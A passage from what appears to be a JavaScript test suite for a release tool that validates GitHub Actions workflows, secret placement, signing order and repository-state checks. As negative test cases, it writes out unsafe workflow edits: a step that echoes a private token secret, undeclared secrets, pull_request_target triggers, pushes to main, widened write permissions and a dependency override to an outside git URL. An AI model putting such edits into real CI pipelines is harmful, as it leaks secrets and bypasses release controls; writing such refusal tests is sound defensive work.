  [SWIFT_RUST_LANES, "ci.yml", "dev-artifact-mac"],
  [SWIFT_RUST_LANES, "release-candidate.yml", "candidate"],
  [SWIFT_RUST_LANES, "regenerate.yml", "regenerate"],
];

test("refuses the swift.privatePackages secret in an allowed job anywhere but the env of the two rendered steps", () => {
  const mutations = [
    ["an extra step that echoes it", (text) => editText(text, "\n    steps:\n", "\n    steps:\n      - run: echo \"${{ secrets.SWIFT_PRIVATE_TOKEN }}\"\n"), SWIFT_ENV_LINE],
    ["job-level env", (text) => editText(text, "\n    steps:\n", "\n    env:\n      TOKEN: ${{ secrets.SWIFT_PRIVATE_TOKEN }}\n    steps:\n"), SWIFT_ENV_LINE],
    ["the env line under an unrelated step", (text) => editText(text, "\n    steps:\n", "\n    steps:\n      - name: Gate\n        env:\n          RIGHT_GIT_PRIVATE_TOKEN_0: ${{ secrets.SWIFT_PRIVATE_TOKEN }}\n        run: bash ./gate.sh\n"), SWIFT_ENV_STEPS],
    ["the configure step renamed", (text) => editText(text, "- name: Configure private Swift package access", "- name: Configure something else"), SWIFT_ENV_STEPS],
    ["the env line moved under with:", (text) => editText(text, "        env:\n          RIGHT_GIT_PRIVATE_TOKEN_0", "        with:\n          RIGHT_GIT_PRIVATE_TOKEN_0"), SWIFT_ENV_STEPS],
    ["an env index that names no declared entry", (text) => editText(text, "RIGHT_GIT_PRIVATE_TOKEN_0: ${{ secrets.SWIFT_PRIVATE_TOKEN }}", "RIGHT_GIT_PRIVATE_TOKEN_1: ${{ secrets.SWIFT_PRIVATE_TOKEN }}"), SWIFT_ENV_LINE],
    ["a secret the manifest does not declare", (text) => editText(text, /secrets\.SWIFT_PRIVATE_TOKEN/g, "secrets.UNDECLARED_TOKEN"), /secrets\.UNDECLARED_TOKEN: not an allowed release secret and not declared in \.rightgit\.json swift\.privatePackages/],
    ["a second secret beside the declared one", (text) => editText(text, "        run: |\n          set -euo pipefail", "          EXTRA: ${{ secrets.UNDECLARED_TOKEN }}\n        run: |\n          set -euo pipefail"), /secrets\.UNDECLARED_TOKEN: not an allowed release secret/],
  ];
  for (const [manifest, name, job] of SWIFT_ALLOWED_JOBS) {
    for (const [label, edit, detail] of mutations) {
      const workflows = renderedWorkflows(manifest);
      workflows[name] = editJob(workflows[name], job, edit);
      assertRefused(manifest, workflows, detail, `${manifest.profile ?? "node"}/${name}/${job}: ${label}`);
    }
  }
  // The same reference at workflow level, outside every job.
  for (const [manifest, name] of [[SWIFT_NODE_LANES, "qualification.yml"], [SWIFT_NODE_LANES, "release-candidate.yml"], [SWIFT_NODE_LANES, "regenerate.yml"], [SWIFT_RUST_LANES, "ci.yml"]]) {
    const workflows = renderedWorkflows(manifest);
    workflows[name] = editText(workflows[name], "\njobs:\n", "\nenv:\n  TOKEN: ${{ secrets.SWIFT_PRIVATE_TOKEN }}\njobs:\n");
    assertRefused(manifest, workflows, new RegExp(`secrets\\.SWIFT_PRIVATE_TOKEN: reference sits outside every job of ${name.replace(".", "\\.")}`), `${name}: workflow-level env`);
  }
});

test("attributes a swift.privatePackages env line to a step of its own job, never to the last step of the job before", () => {
  const workflows = renderedWorkflows(SWIFT_NODE_LANES);
  // The guard job's last step takes the cleanup step's name; the qualification job then holds a services env
  // line of the exact rendered shape before any step of its own.
  workflows["qualification.yml"] = editText(workflows["qualification.yml"], "- name: Refuse private repository", "- name: Remove private Swift package access");
  workflows["qualification.yml"] = editJob(workflows["qualification.yml"], "qualification", (text) => editText(text, "\n    steps:\n", "\n    services:\n      db:\n        env:\n          RIGHT_GIT_PRIVATE_TOKEN_0: ${{ secrets.SWIFT_PRIVATE_TOKEN }}\n    steps:\n"));
  assertRefused(SWIFT_NODE_LANES, workflows, SWIFT_ENV_STEPS, "services env line");
});

test("binds ci.yml jobs to the profile that renders them and refuses a secret named like a signing or publishing secret", () => {
  const nodeAsDevArtifact = renderedWorkflows(SWIFT_NODE_LANES);
  nodeAsDevArtifact["ci.yml"] = editText(nodeAsDevArtifact["ci.yml"], "\n  test:\n", "\n  dev-artifact-mac:\n");
  assertRefused(SWIFT_NODE_LANES, nodeAsDevArtifact, /secrets\.SWIFT_PRIVATE_TOKEN: job 'dev-artifact-mac' of ci\.yml is rendered only for profile rust-hybrid with devArtifact\.parallel/, "node profile, dev-artifact-mac");

  const rustAsTest = renderedWorkflows(SWIFT_RUST_LANES);
  rustAsTest["ci.yml"] = editText(rustAsTest["ci.yml"], "\n  ci:\n", "\n  test:\n");
  assertRefused(SWIFT_RUST_LANES, rustAsTest, /secrets\.SWIFT_PRIVATE_TOKEN: job 'test' of ci\.yml is rendered only for the node profile/, "rust-hybrid profile, test");

  const noParallel = { ...SWIFT_RUST_LANES, devArtifact: { ...SWIFT_RUST_LANES.devArtifact, parallel: undefined, buildScript: undefined } };
  assertRefused(noParallel, renderedWorkflows(SWIFT_RUST_LANES), /secrets\.SWIFT_PRIVATE_TOKEN: job 'dev-artifact-mac' of ci\.yml is rendered only for profile rust-hybrid with devArtifact\.parallel/, "manifest without devArtifact.parallel");

  for (const [manifest, secret] of [[SWIFT_NODE_LANES, "APPLE_CERTIFICATE_BASE64"], [SWIFT_RUST_CHAIN, "CLOUDFLARE_API_TOKEN"], [SWIFT_PUBLISH_LANES, "HOMEBREW_TAP_TOKEN"]]) {
    const colliding = { ...manifest, swift: { privatePackages: [{ host: "github.com", secret }] } };
    assertRefused(colliding, renderedWorkflows(colliding), new RegExp(`secrets\\.${secret}: \\.rightgit\\.json swift\\.privatePackages declares a signing or publishing secret name`), `colliding ${secret}`);
  }
});

test("accepts every right-git lane the manifest schema allows", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  const lanes = ["ci", "qualification", "package-smoke", "release-candidate", "publish-npm", "publish-package-managers"];
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes }));
  for (const lane of lanes) writeFileSync(path.join(workflowDir, `${lane}.yml`), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add every managed lane");
  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

const REGENERATE_WORKFLOW = [
  "# Managed by right-git",
  "on:",
  "  workflow_dispatch:",
  "permissions:",
  "  contents: read",
  "jobs:",
  "  private-repo-guard:",
  "    runs-on: ubuntu-24.04",
  "  regenerate:",
  "    needs: [private-repo-guard]",
  "    if: ${{ github.event_name == 'workflow_dispatch' }}",
  "    permissions:",
  "      contents: write",
  "      pull-requests: write",
  "    steps:",
  "      - run: |",
  "          branch=\"right-git/regenerate-${{ github.run_id }}-${{ github.run_attempt }}\"",
  "          git push origin \"HEAD:refs/heads/$branch\"",
  "",
].join("\n");

test("accepts the right-git regenerate lane: manual-only, branch-scoped write, declared in the manifest", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "regenerate"], regenerate: { script: "regenerate" } }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  writeFileSync(path.join(workflowDir, "regenerate.yml"), REGENERATE_WORKFLOW);
  git(root, "add", ".");
  git(root, "commit", "-m", "add regenerate lane");
  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

test("rejects a regenerate workflow that is undeclared, push-triggered, writes the default branch, or widens permissions", () => {
  const cases = [
    { name: "undeclared", manifest: { lanes: ["ci", "regenerate"] }, workflow: REGENERATE_WORKFLOW },
    { name: "push trigger", manifest: { lanes: ["ci", "regenerate"], regenerate: { script: "regenerate" } }, workflow: REGENERATE_WORKFLOW.replace("on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n  push:\n    branches: [main]\n") },
    { name: "default-branch push", manifest: { lanes: ["ci", "regenerate"], regenerate: { script: "regenerate" } }, workflow: REGENERATE_WORKFLOW.replace('git push origin \"HEAD:refs/heads/$branch\"', 'git push origin \"HEAD:refs/heads/$branch\"\n          git push origin HEAD:main') },
    { name: "job not dispatch-gated", manifest: { lanes: ["ci", "regenerate"], regenerate: { script: "regenerate" } }, workflow: REGENERATE_WORKFLOW.replace("    if: ${{ github.event_name == 'workflow_dispatch' }}\n", "") },
    { name: "actions write", manifest: { lanes: ["ci", "regenerate"], regenerate: { script: "regenerate" } }, workflow: REGENERATE_WORKFLOW.replace("      pull-requests: write\n", "      pull-requests: write\n      actions: write\n") },
    { name: "top-level write", manifest: { lanes: ["ci", "regenerate"], regenerate: { script: "regenerate" } }, workflow: REGENERATE_WORKFLOW.replace("permissions:\n  contents: read\n", "permissions:\n  contents: write\n") },
  ];
  for (const { name, manifest, workflow } of cases) {
    const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
    const root = path.dirname(config);
    const workflowDir = path.join(root, ".github", "workflows");
    mkdirSync(workflowDir, { recursive: true });
    writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", ...manifest }));
    writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
    writeFileSync(path.join(workflowDir, "regenerate.yml"), workflow);
    git(root, "add", ".");
    git(root, "commit", "-m", `unsafe regenerate: ${name}`);
    const result = run(config, "--tier=patch");
    assert.notEqual(result.status, 0, name);
    assert.match(result.stderr, /release-capable permissions or secrets/i, name);
  }
});

test("rejects broad manual dispatch authority for Apple signing in the tag-last lane", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"], candidate: { signMacos: true } }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  writeFileSync(path.join(workflowDir, "release-candidate.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs:\n  macos-sign:\n    needs: [admission, candidate]\n    if: ${{ github.event_name == 'workflow_dispatch' }}\n    env:\n      CERT: ${{ secrets.APPLE_CERTIFICATE_BASE64 }}\n      PASS: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}\n      KEYCHAIN: ${{ secrets.APPLE_KEYCHAIN_PASSWORD }}\n      KEY: ${{ secrets.APPLE_API_KEY_BASE64 }}\n      KEY_ID: ${{ secrets.APPLE_API_KEY }}\n      ISSUER: ${{ secrets.APPLE_API_ISSUER }}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add broad tag-last manual mac candidate workflow");
  const result = run(config, "--tier=patch");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release-capable permissions or secrets/i);
});

test("rejects broad manual dispatch authority for Apple signing", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"], candidate: { signMacos: true } }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  writeFileSync(path.join(workflowDir, "release-candidate.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs:\n  macos-sign:\n    needs: [candidate]\n    if: ${{ github.event_name == 'workflow_dispatch' }}\n    env:\n      CERT: ${{ secrets.APPLE_CERTIFICATE_BASE64 }}\n      PASS: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}\n      KEYCHAIN: ${{ secrets.APPLE_KEYCHAIN_PASSWORD }}\n      KEY: ${{ secrets.APPLE_API_KEY_BASE64 }}\n      KEY_ID: ${{ secrets.APPLE_API_KEY }}\n      ISSUER: ${{ secrets.APPLE_API_ISSUER }}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add broad manual mac candidate workflow");
  const result = run(config, "--tier=patch");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release-capable permissions or secrets/i);
});

test("rejects undeclared Apple secrets or pull_request_target in candidate lane", () => {
  for (const unsafe of ["TOKEN: ${{ secrets.UNRELATED }}", "on:\n  pull_request_target:"]) {
    const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
    const root = path.dirname(config);
    const workflowDir = path.join(root, ".github", "workflows");
    mkdirSync(workflowDir, { recursive: true });
    writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"], candidate: { signMacos: true } }));
    writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
    writeFileSync(path.join(workflowDir, "release-candidate.yml"), `# Managed by right-git\n${unsafe}\npermissions:\n  contents: read\njobs: {}\n`);
    git(root, "add", ".");
    git(root, "commit", "-m", "add unsafe mac candidate workflow");
    const result = run(config, "--tier=patch");
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /release-capable permissions or secrets/i);
  }
});

test("permits declared release-chain publish secret & contents write in a legacy tag-only lane", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({
    schemaVersion: 1,
    compile: "github-actions-only",
    lanes: ["ci", "release-candidate"],
    candidate: {
      signWindows: true,
      releaseChain: { publishSecrets: ["CLOUDFLARE_API_TOKEN"] },
    },
  }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  writeFileSync(path.join(workflowDir, "release-candidate.yml"), `# Managed by right-git
permissions:
  contents: read
jobs:
  publish:
    needs: [installed-qualification]
    if: \${{ startsWith(github.ref, 'refs/tags/v') && needs.installed-qualification.result == 'success' }}
    permissions:
      contents: write
    steps:
      - run: publish
        env:
          TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN }}
`);
  git(root, "add", ".");
  git(root, "commit", "-m", "add protected release chain");
  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

test("rejects release-chain publish authority without exact tag qualification gate in the legacy lane", () => {
  for (const unsafe of [
    "if: ${{ github.event_name == 'workflow_dispatch' }}",
    "if: ${{ startsWith(github.ref, 'refs/tags/v') && needs.installed-qualification.result == 'success' }}\n    env:\n      TOKEN: ${{ secrets.UNRELATED }}",
  ]) {
    const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
    const root = path.dirname(config);
    const workflowDir = path.join(root, ".github", "workflows");
    mkdirSync(workflowDir, { recursive: true });
    writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"], candidate: { signWindows: true, releaseChain: { publishSecrets: ["CLOUDFLARE_API_TOKEN"] } } }));
    writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
    writeFileSync(path.join(workflowDir, "release-candidate.yml"), `# Managed by right-git
permissions:
  contents: read
jobs:
  publish:
    needs: [installed-qualification]
    ${unsafe}
    permissions:
      contents: write
    steps: []
`);
    git(root, "add", ".");
    git(root, "commit", "-m", "add unsafe release chain");
    const result = run(config, "--tier=patch");
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /release-capable permissions or secrets/i);
  }
});

test("permits declared release-chain publish secret & contents write behind an admission-gated tag-last qualification gate", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({
    schemaVersion: 1,
    compile: "github-actions-only",
    lanes: ["ci", "release-candidate"],
    candidate: {
      signWindows: true,
      signMacos: true,
      releaseChain: { publishSecrets: ["CLOUDFLARE_API_TOKEN"] },
    },
  }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  writeFileSync(path.join(workflowDir, "release-candidate.yml"), `# Managed by right-git
permissions:
  contents: read
jobs:
  publish:
    needs: [admission, installed-qualification, macos-sign]
    if: \${{ needs.admission.outputs.publish == 'true' && needs.installed-qualification.result == 'success' && needs.macos-sign.result == 'success' }}
    permissions:
      contents: write
    steps:
      - run: publish
        env:
          TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN }}
`);
  git(root, "add", ".");
  git(root, "commit", "-m", "add admission-gated tag-last release chain");
  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

test("rejects release-chain publish authority without exact qualification gate in the tag-last lane", () => {
  for (const unsafe of [
    // No proof this run's admission actually requested publication.
    "if: ${{ github.event_name == 'workflow_dispatch' }}",
    // Windows installed-qualification is proven, but macOS signing success is not —
    // publish must be unreachable unless BOTH signed qualification paths verified.
    "if: ${{ needs.admission.outputs.publish == 'true' && needs.installed-qualification.result == 'success' }}",
    // Every clause present, but riding in on an undeclared secret.
    "if: ${{ needs.admission.outputs.publish == 'true' && needs.installed-qualification.result == 'success' && needs.macos-sign.result == 'success' }}\n    env:\n      TOKEN: ${{ secrets.UNRELATED }}",
  ]) {
    const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
    const root = path.dirname(config);
    const workflowDir = path.join(root, ".github", "workflows");
    mkdirSync(workflowDir, { recursive: true });
    writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"], candidate: { signWindows: true, signMacos: true, releaseChain: { publishSecrets: ["CLOUDFLARE_API_TOKEN"] } } }));
    writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
    writeFileSync(path.join(workflowDir, "release-candidate.yml"), `# Managed by right-git
permissions:
  contents: read
jobs:
  publish:
    needs: [admission, installed-qualification, macos-sign]
    ${unsafe}
    permissions:
      contents: write
    steps: []
`);
    git(root, "add", ".");
    git(root, "commit", "-m", "add unsafe tag-last release chain");
    const result = run(config, "--tier=patch");
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /release-capable permissions or secrets/i);
  }
});

test("doctor accepts an exact crates.io RightKit pin with benign Cargo config", () => {
  const config = fixture({
    platform: hostPlatform,
    macSigning: hostPlatform === "mac",
    cargoManifest: `[package]\nname = "fixture"\nversion = "0.0.0"\nedition = "2021"\n[dependencies]\nrightkit-license = "=0.1.2"`,
    cargoConfig: `[net]\nretry = 2\n[registries.private]\nindex = "https://example.test/index"`,
  });
  const result = runDoctor(config);
  assertDoctorFailsClosedOnlyOnOwnership(result);
  assert.doesNotMatch(`${result.stdout}\n${result.stderr}`, /forbidden RightKit Cargo override/);
});

test("doctor rejects a selected target with missing or empty buildInputs.include", () => {
  for (const buildInputs of [null, { include: [] }]) {
    const result = run(fixture({ buildInputs }), "--doctor");
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /non-empty buildInputs\.include paths/i);
  }
});

test("doctor passes a clean selected target", () => {
  const result = runDoctor(fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac" }));
  assertDoctorFailsClosedOnlyOnOwnership(result);
  assert.match(result.stdout, /\[ok\s+\] target-bridge:/);
  // The running package's own version (package.json), not the feed, which names the previous release.
  const expected = JSON.parse(readFileSync(new URL("./package.json", import.meta.url), "utf8")).version;
  assert.match(result.stdout, new RegExp(`right-release ${expected.replace(/\./g, "\\.")}`));
});

test("doctor handles a real src-tauri target according to host Cargo ownership", (t) => {
  const config = fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac" });
  mkdirSync(path.join(path.dirname(config), "src-tauri", "target"));
  const result = runDoctor(config);
  const output = `${result.stdout}\n${result.stderr}`;
  if (brokerManagedHost(process.env)) {
    assertDoctorFailsClosedOnlyOnOwnership(result);
    assert.doesNotMatch(output, /cache migrate/i);
    assert.match(output, /target-bridge[\s\S]*broker-managed host, left untouched/i);
  } else {
    assert.notEqual(result.status, 0);
    // Without a managed broker, a host with enrollment still pending reports ownership as a WARN
    // backlog diagnostic, so the protected-trust FAIL is not reachable here.
    if (/ownership approval enrollment is pending/.test(output) && !/\[FAIL\] ownership:/.test(output)) {
      const reason = "ownership enrollment pending and no managed Cargo broker on this host; protected ownership FAIL is not reachable";
      if (process.env.RIGHTKIT_REQUIRE_ASSETS === "1") assert.fail(reason);
      t.skip(reason);
      return;
    }
    // The concrete fail-closed ownership diagnostic depends on host trust state and fixture lock contents.
    // Require ownership to block while keeping this test focused on target-bridge behavior.
    assert.match(output, /\[FAIL\] ownership: /);
    assert.match(output, /target-bridge[\s\S]*real directory[\s\S]*cache migrate/i);
  }
});

test("doctor permits unrelated dirt", () => {
  const config = fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac" });
  const root = path.dirname(config);
  mkdirSync(path.join(root, "notes"));
  writeFileSync(path.join(root, "notes", "scratch.md"), "unrelated\n");
  const result = runDoctor(config);
  assertDoctorFailsClosedOnlyOnOwnership(result);
  assert.doesNotMatch(`${result.stdout}\n${result.stderr}`, /dirty files can change the packaged app/);
});

test("doctor rejects tracked dirt inside declared buildInputs with the exact path", () => {
  const config = fixture();
  writeFileSync(path.join(path.dirname(config), "src-tauri", "lib.rs"), "pub fn changed() {}\n");
  const result = run(config, "--doctor");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /dirty files can change the packaged app[\s\S]*- src-tauri\/lib\.rs/i);
});

test("doctor rejects untracked dirt inside declared buildInputs with the exact path", () => {
  const config = fixture();
  writeFileSync(path.join(path.dirname(config), "src-tauri", "new-runtime.rs"), "pub fn new_runtime() {}\n");
  const result = run(config, "--doctor");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /dirty files can change the packaged app[\s\S]*- src-tauri\/new-runtime\.rs/i);
});

test("doctor rejects dirty required release metadata even when it is not declared", () => {
  const config = fixture({ buildInputs: { include: ["src-tauri/lib.rs"] } });
  writeFileSync(path.join(path.dirname(config), "pnpm-lock.yaml"), `${readFileSync(path.join(path.dirname(config), "pnpm-lock.yaml"), "utf8")}# dirty\n`);
  const result = run(config, "--doctor");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /dirty files can change the packaged app[\s\S]*- pnpm-lock\.yaml/i);
});

test("doctor rejects a dirty release config before importing it", () => {
  const config = fixture();
  writeFileSync(config, `${readFileSync(config, "utf8")}\n// dirty config\n`);
  const result = run(config, "--doctor");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /dirty release config cannot be executed[\s\S]*- right-release\.config\.mjs/i);
});

test("doctor rejects linked and detached checkouts like build runtime", () => {
  const primaryConfig = fixture();
  const primary = path.dirname(primaryConfig);
  const linked = `${primary}-linked`;
  git(primary, "worktree", "add", "--detach", linked);
  const linkedResult = run(path.join(linked, "right-release.config.mjs"), "--doctor");
  assert.notEqual(linkedResult.status, 0);
  assert.match(linkedResult.stderr, /must be invoked from the primary Git worktree/i);

  git(primary, "checkout", "--detach");
  const detachedResult = run(primaryConfig, "--doctor");
  assert.notEqual(detachedResult.status, 0);
  assert.match(detachedResult.stderr, /detached HEAD is forbidden/i);
});

test("doctor scopes Cargo inspection to the configured app inside a monorepo", () => {
  const config = fixture({
    platform: hostPlatform,
    macSigning: hostPlatform === "mac",
    cargoManifest: `[package]\nname = "fixture"\nversion = "0.0.0"\nedition = "2021"\n[dependencies]\nrightkit-license = "=0.1.2"`,
    repoCargoConfig: `[net]\nretry = 2`,
    siblingCargoManifest: `[package]\nname = "archived-copy"\nversion = "0.0.0"\n[dependencies]\nrightkit-license = { path = "../../rightkit-license" }`,
  });
  const result = runDoctor(config);
  assertDoctorFailsClosedOnlyOnOwnership(result);
  assert.doesNotMatch(`${result.stdout}\n${result.stderr}`, /forbidden RightKit Cargo override|archived-workspace/);
});

test("doctor rejects a repo-local RightKit Cargo override", () => {
  const config = fixture({
    cargoManifest: `[package]\nname = "fixture"\nversion = "0.0.0"\nedition = "2021"\n[dependencies]\nrightkit-license = "=0.1.2"`,
    cargoConfig: `[patch.crates-io]\nrightkit-license = { path = "../rightkit-license" }`,
  });
  const result = run(config, "--doctor");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /forbidden RightKit Cargo override/i);
});

test("doctor rejects a RightKit override at an ancestor repository root", () => {
  const config = fixture({
    cargoManifest: `[package]\nname = "fixture"\nversion = "0.0.0"\nedition = "2021"\n[dependencies]\nrightkit-license = "=0.1.2"`,
    repoCargoConfig: `[patch.crates-io]\nrightkit-license = { git = "https://example.test/rightkit-license.git" }`,
  });
  const result = run(config, "--doctor");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /forbidden RightKit Cargo override/i);
});

test("combined build and upload is rejected before the package step", () => {
  const result = run(fixture({ publish: true }), "--tier=update", "--upload");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /combined build\+upload was removed/i);
  assert.doesNotMatch(result.stdout, /node -e process\.exit\(0\)/);
});

test("Windows tier-neutral build builds raw EXE, signs it, bundles, signs installer, then minisigns updater payload", () => {
  const result = run(fixture({ publish: true }));
  assert.equal(result.status, 0, result.stderr);
  const rawBuildAt = result.stdout.indexOf("node -e");
  const rawSignAt = result.stdout.indexOf("signing windows raw-exe");
  const bundleAt = result.stdout.indexOf("node -e", rawSignAt);
  const installerSignAt = result.stdout.indexOf("signing windows installer");
  const updaterAt = result.stdout.indexOf("sign-updater.mjs");
  assert.ok(rawBuildAt >= 0, result.stdout);
  assert.ok(rawSignAt > rawBuildAt, result.stdout);
  assert.ok(bundleAt > rawSignAt, result.stdout);
  assert.ok(installerSignAt > bundleAt, result.stdout);
  assert.ok(updaterAt > installerSignAt, result.stdout);
  assert.doesNotMatch(result.stdout, /publish-update\.mjs/);
});

test("Windows verifies the installer embeds the signed EXE after bundling and before the installer is signed", () => {
  const result = run(fixture({ publish: true }));
  assert.equal(result.status, 0, result.stderr);
  const rawSignAt = result.stdout.indexOf("signing windows raw-exe");
  const bundleAt = result.stdout.indexOf("node -e", rawSignAt);
  const embeddingAt = result.stdout.indexOf("verify installer embeds the signed raw EXE");
  const installerSignAt = result.stdout.indexOf("signing windows installer");
  assert.ok(embeddingAt > bundleAt, `embedding check must follow bundling:\n${result.stdout}`);
  assert.ok(installerSignAt > embeddingAt, `a mutated payload must never reach the installer signature:\n${result.stdout}`);
});

test("legacy internal tier does not make the build worker upload", () => {
  const result = run(fixture({ publish: true }), "--tier=update");
  assert.equal(result.status, 0, result.stderr);
  const azureAt = result.stdout.indexOf("sign-windows.mjs");
  const updaterAt = result.stdout.indexOf("sign-updater.mjs");
  assert.ok(azureAt >= 0, result.stdout);
  assert.ok(updaterAt > azureAt, result.stdout);
  assert.doesNotMatch(result.stdout, /publish-update\.mjs/);
});

test("release sweeps stale rust artifacts when a target dir exists", () => {
  const config = fixture();
  const dir = path.dirname(config);
  mkdirSync(path.join(dir, "src-tauri", "target"), { recursive: true });
  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /dry-run: cargo sweep --installed .*src-tauri/);
});

test("release skips the sweep when no target dir exists", () => {
  const result = run(fixture(), "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
  assert.doesNotMatch(result.stdout, /cargo sweep/);
});

test("release lock is single-flight and is cleaned after success", () => {
  const { dir, config } = lockFixture();
  git(dir, "init", "--initial-branch", "main");
  git(dir, "config", "user.email", "release-test@example.com");
  git(dir, "config", "user.name", "Release Test");
  git(dir, "add", ".");
  git(dir, "commit", "-m", "initial");
  const lockPath = path.join(dir, ".cache", "right-release", "mac.lock.json");
  const result = runRaw(config, "--platform", "mac", "--tier=patch", "--dry-run");
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /right-release: done/);
  assert.equal(existsSync(lockPath), false);
});

test("portable Windows targets gate NSIS validation by signing contract", () => {
  const source = readFileSync(release, "utf8");
  assert.match(source, /target\.signingContract === WINDOWS_NSIS_SIGNING_CONTRACT/);
  assert.match(source, /target\.signingContract === WINDOWS_PORTABLE_SIGNING_CONTRACT/);
  assert.doesNotMatch(source, /assertNsisInPlaceUpgradeContract/);
});

test("native finalization is ordered after raw signing and before packaging", () => {
  const source = readFileSync(release, "utf8");
  const signing = source.indexOf('await signWindows([...rawFiles, ...sidecarFiles], "raw-exe", root);');
  const finalization = source.indexOf("nativeFinalization = await runNativeFinalizer", signing);
  const packaging = source.indexOf("await runCommand(command, root);", finalization);
  assert.ok(signing >= 0, source);
  assert.ok(finalization > signing, source);
  assert.ok(packaging > finalization, source);
});

test("a release is refused when the app has no QA lane, naming the rule and how to adopt it", () => {
  const result = run(fixture({ qa: false }));
  assert.notEqual(result.status, 0);
  assert.match(`${result.stdout}
${result.stderr}`, /RightKit QA is mandatory for every Orthic Labs app, and fixture has no QA lane/);
});

const SWIFT_CHECK_ONLY = {
  ...SWIFT_NODE_LANES,
  lanes: ["swift-check"],
  regenerate: undefined,
